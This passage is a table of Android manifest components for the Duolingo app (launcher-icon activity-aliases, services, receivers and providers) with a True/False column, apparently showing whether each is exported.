| activity-alias | `com.duolingo.app.StreakSaverLauncher4FixedLightingExclamationMarks` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher4FixedLightingAlarmClockPrefix` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher4FixedLightingExclamationMarksPrefix` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher4FixedLightingSirenPrefix` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher4FixedLightingEyes` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher4FixedLightingInterrobang` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher5FixedLighting` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher5FixedLightingEmojiQuestionMark` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher5FixedLightingHourglass` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher5FixedLightingAlarmClock` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher5FixedLightingSiren` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher5FixedLightingExclamationMarks` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher5FixedLightingAlarmClockPrefix` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher5FixedLightingExclamationMarksPrefix` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher5FixedLightingSirenPrefix` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher5FixedLightingEyes` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher5FixedLightingInterrobang` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher6FixedLighting` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher6FixedLightingEmojiQuestionMark` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher6FixedLightingHourglass` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher6FixedLightingAlarmClock` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher6FixedLightingSiren` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher6FixedLightingExclamationMarks` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher6FixedLightingAlarmClockPrefix` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher6FixedLightingExclamationMarksPrefix` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher6FixedLightingSirenPrefix` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher6FixedLightingEyes` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher6FixedLightingInterrobang` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher7FixedLighting` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher7FixedLightingEmojiQuestionMark` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher7FixedLightingHourglass` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher7FixedLightingAlarmClock` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher7FixedLightingSiren` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher7FixedLightingExclamationMarks` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher7FixedLightingAlarmClockPrefix` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher7FixedLightingExclamationMarksPrefix` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher7FixedLightingSirenPrefix` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher7FixedLightingEyes` | True |  |
| activity-alias | `com.duolingo.app.StreakSaverLauncher7FixedLightingInterrobang` | True |  |
| activity-alias | `com.duolingo.app.UnhingedSickLauncher` | True |  |
| activity-alias | `com.duolingo.app.UnhingedSickLauncherThermometer` | True |  |
| activity-alias | `com.duolingo.app.UnhingedStuffLauncher` | True |  |
| activity-alias | `com.duolingo.app.UnhingedStuffLauncherDroplet` | True |  |
| activity-alias | `com.duolingo.app.UnhingedCryLauncher` | True |  |
| activity-alias | `com.duolingo.app.UnhingedCryLauncherBrokenHeart` | True |  |
| activity-alias | `com.duolingo.app.StreakFrozenLauncher1` | True |  |
| activity-alias | `com.duolingo.app.StreakFrozenLauncher1EmojiQuestionMark` | True |  |
| activity-alias | `com.duolingo.app.StreakFrozenLauncher1Siren` | True |  |
| activity-alias | `com.duolingo.app.StreakFrozenLauncher1IceCube` | True |  |
| activity-alias | `com.duolingo.app.StreakFrozenLauncher1FrozenFace` | True |  |
| activity-alias | `com.duolingo.app.StreakFrozenLauncher1Snowflake` | True |  |
| activity-alias | `com.duolingo.app.StreakFrozenLauncher1ExclamationMarks` | True |  |
| activity-alias | `com.duolingo.app.StreakFrozenLauncher2` | True |  |
| activity-alias | `com.duolingo.app.StreakFrozenLauncher2EmojiQuestionMark` | True |  |
| activity-alias | `com.duolingo.app.StreakFrozenLauncher2Siren` | True |  |
| activity-alias | `com.duolingo.app.StreakFrozenLauncher2IceCube` | True |  |
| activity-alias | `com.duolingo.app.StreakFrozenLauncher2FrozenFace` | True |  |
| activity-alias | `com.duolingo.app.StreakFrozenLauncher2Snowflake` | True |  |
| activity-alias | `com.duolingo.app.StreakFrozenLauncher2ExclamationMarks` | True |  |
| activity-alias | `com.duolingo.app.StreakFrozenLauncher3` | True |  |
| activity-alias | `com.duolingo.app.StreakFrozenLauncher3EmojiQuestionMark` | True |  |
| activity-alias | `com.duolingo.app.StreakFrozenLauncher3Siren` | True |  |
| activity-alias | `com.duolingo.app.StreakFrozenLauncher3IceCube` | True |  |
| activity-alias | `com.duolingo.app.StreakFrozenLauncher3FrozenFace` | True |  |
| activity-alias | `com.duolingo.app.StreakFrozenLauncher3Snowflake` | True |  |
| activity-alias | `com.duolingo.app.StreakFrozenLauncher3ExclamationMarks` | True |  |
| activity-alias | `com.duolingo.app.StreakFrozenLauncher4` | True |  |
| activity-alias | `com.duolingo.app.StreakFrozenLauncher4EmojiQuestionMark` | True |  |
| activity-alias | `com.duolingo.app.StreakFrozenLauncher4Siren` | True |  |
| activity-alias | `com.duolingo.app.StreakFrozenLauncher4IceCube` | True |  |
| activity-alias | `com.duolingo.app.StreakFrozenLauncher4FrozenFace` | True |  |
| activity-alias | `com.duolingo.app.StreakFrozenLauncher4Snowflake` | True |  |
| activity-alias | `com.duolingo.app.StreakFrozenLauncher4ExclamationMarks` | True |  |
| activity-alias | `com.duolingo.app.StreakFrozenLauncher5` | True |  |
| activity-alias | `com.duolingo.app.StreakFrozenLauncher5EmojiQuestionMark` | True |  |
| activity-alias | `com.duolingo.app.StreakFrozenLauncher5Siren` | True |  |
| activity-alias | `com.duolingo.app.StreakFrozenLauncher5IceCube` | True |  |
| activity-alias | `com.duolingo.app.StreakFrozenLauncher5FrozenFace` | True |  |
| activity-alias | `com.duolingo.app.StreakFrozenLauncher5Snowflake` | True |  |
| activity-alias | `com.duolingo.app.StreakFrozenLauncher5ExclamationMarks` | True |  |
| activity-alias | `com.duolingo.app.StreakFrozenLauncher6` | True |  |
| activity-alias | `com.duolingo.app.StreakFrozenLauncher6EmojiQuestionMark` | True |  |
| activity-alias | `com.duolingo.app.StreakFrozenLauncher6Siren` | True |  |
| activity-alias | `com.duolingo.app.StreakFrozenLauncher6IceCube` | True |  |
| activity-alias | `com.duolingo.app.StreakFrozenLauncher6FrozenFace` | True |  |
| activity-alias | `com.duolingo.app.StreakFrozenLauncher6Snowflake` | True |  |
| activity-alias | `com.duolingo.app.StreakFrozenLauncher6ExclamationMarks` | True |  |
| activity-alias | `com.duolingo.app.StreakRepairLauncher1` | True |  |
| activity-alias | `com.duolingo.app.StreakRepairLauncher2` | True |  |
| activity-alias | `com.duolingo.app.StreakRepairLauncher3` | True |  |
| activity-alias | `com.duolingo.app.BackgroundedLauncher` | True |  |
| activity-alias | `com.duolingo.app.BackgroundedLauncherBrokenHeart` | True |  |
| activity-alias | `com.duolingo.app.ExtendedLauncher` | True |  |
| activity-alias | `com.duolingo.app.InactiveDarkLauncher` | True |  |
| activity-alias | `com.duolingo.app.InactiveDarkLauncherLightBulb` | True |  |
| activity-alias | `com.duolingo.app.InactiveScreamLauncher` | True |  |
| activity-alias | `com.duolingo.app.InactiveScreamLauncherScream` | True |  |
| activity-alias | `com.duolingo.app.InactiveBlackAndWhiteLauncher` | True |  |
| activity-alias | `com.duolingo.app.InactiveBlackAndWhiteLauncherEyes` | True |  |
| activity-alias | `com.duolingo.app.InactiveChickenLauncher` | True |  |
| activity-alias | `com.duolingo.app.InactiveChickenLauncherChicken` | True |  |
| activity-alias | `com.duolingo.app.InactiveBoneLauncher` | True |  |
| activity-alias | `com.duolingo.app.InactiveBoneLauncherBone` | True |  |
| activity-alias | `com.duolingo.wxapi.WXPayEntryActivity` | True |  |
| activity-alias | `com.duolingo.wxapi.WXEntryActivity` | True |  |
| service | `com.duolingo.notifications.NotificationIntentService` | False |  |
| service | `com.duolingo.notifications.NotificationIntentServiceProxy` | False |  |
| service | `com.duolingo.core.account.AccountService` | True |  |
| service | `com.duolingo.notifications.FcmIntentService` | True |  |
| service | `com.duolingo.feature.unity.bridge.service.UnityBridgeService` | False |  |
| service | `androidx.credentials.playservices.CredentialProviderMetadataHolder` | False |  |
| service | `androidx.camera.core.impl.MetadataHolderService` | False |  |
| service | `com.google.android.gms.auth.api.signin.RevocationBoundService` | True |  |
| service | `com.google.firebase.messaging.FirebaseMessagingService` | False |  |
| service | `com.google.firebase.components.ComponentDiscoveryService` | False |  |
| service | `com.google.android.gms.measurement.AppMeasurementService` | False |  |
| service | `com.google.android.gms.measurement.AppMeasurementJobService` | False |  |
| service | `com.google.android.gms.ads.AdService` | False |  |
| service | `androidx.work.impl.background.systemjob.SystemJobService` | True |  |
| service | `androidx.work.impl.foreground.SystemForegroundService` | False |  |
| service | `androidx.room.MultiInstanceInvalidationService` | False |  |
| service | `com.google.android.datatransport.runtime.backends.TransportBackendDiscovery` | False |  |
| service | `com.google.android.datatransport.runtime.scheduling.jobscheduling.JobInfoSchedulerService` | False |  |
| receiver | `androidx.tracing.profiler.ConnectedProfilerTracingReceiver` | True |  |
| receiver | `com.duolingo.streak.streakWidget.StreakWidgetProvider` | False |  |
| receiver | `com.duolingo.streak.streakWidget.MediumStreakWidgetProvider` | False |  |
| receiver | `com.duolingo.streak.streakWidget.StreakWidgetUpdateBroadcastReceiver` | False |  |
| receiver | `com.duolingo.notifications.FollowUpNotificationBroadcastReceiver` | False |  |
| receiver | `com.duolingo.notifications.TriggeredNotificationDelayedBroadcastReceiver` | False |  |
| receiver | `com.duolingo.feature.appicon.AppIconUpdateBroadcastReceiver` | False |  |
| receiver | `com.duolingo.core.streak.alarm.StreakAlarmReceiver` | False |  |
| receiver | `com.duolingo.core.share.ShareReceiver` | False |  |
| receiver | `zendesk.support.DeepLinkingBroadcastReceiver` | False |  |
| receiver | `com.google.firebase.iid.FirebaseInstanceIdReceiver` | True |  |
| receiver | `com.google.android.gms.measurement.AppMeasurementReceiver` | False |  |
| receiver | `com.facebook.CurrentAccessTokenExpirationBroadcastReceiver` | False |  |
| receiver | `com.facebook.AuthenticationTokenManager$CurrentAuthenticationTokenChangedBroadcastReceiver` | False |  |
| receiver | `androidx.work.impl.utils.ForceStopRunnable$BroadcastReceiver` | False |  |
| receiver | `androidx.work.impl.background.systemalarm.RescheduleReceiver` | False |  |
| receiver | `androidx.work.impl.diagnostics.DiagnosticsReceiver` | True |  |
| receiver | `androidx.profileinstaller.ProfileInstallReceiver` | True |  |
| receiver | `androidx.tracing.profiler.ConnectedProfilerTracingEnabledReceiver` | False |  |
| receiver | `com.google.android.datatransport.runtime.scheduling.jobscheduling.AlarmManagerSchedulerBroadcastReceiver` | False |  |
| provider | `com.facebook.FacebookContentProvider` | True |  |
| provider | `androidx.core.content.FileProvider` | False |  |
| provider | `zendesk.support.SupportSdkStartupProvider` | False |  |
| provider | `zendesk.support.guide.GuideSdkStartupProvider` | False |  |
| provider | `com.facebook.ads.AudienceNetworkContentProvider` | False |  |
| provider | `com.vungle.ads.VungleProvider` | False |  |
| provider | `com.google.android.gms.ads.MobileAdsInitProvider` | False |  |
| provider | `zendesk.belvedere.BelvedereFileProvider` | False |  |
| provider | `com.squareup.picasso.PicassoProvider` | False |  |
| provider | `com.ironsource.lifecycle.IronsourceLifecycleProvider` | False |  |
| provider | `com.ironsource.lifecycle.LevelPlayActivityLifecycleProvider` | False |  |
| provider | `com.adjust.sdk.SystemLifecycleContentProvider` | False |  |
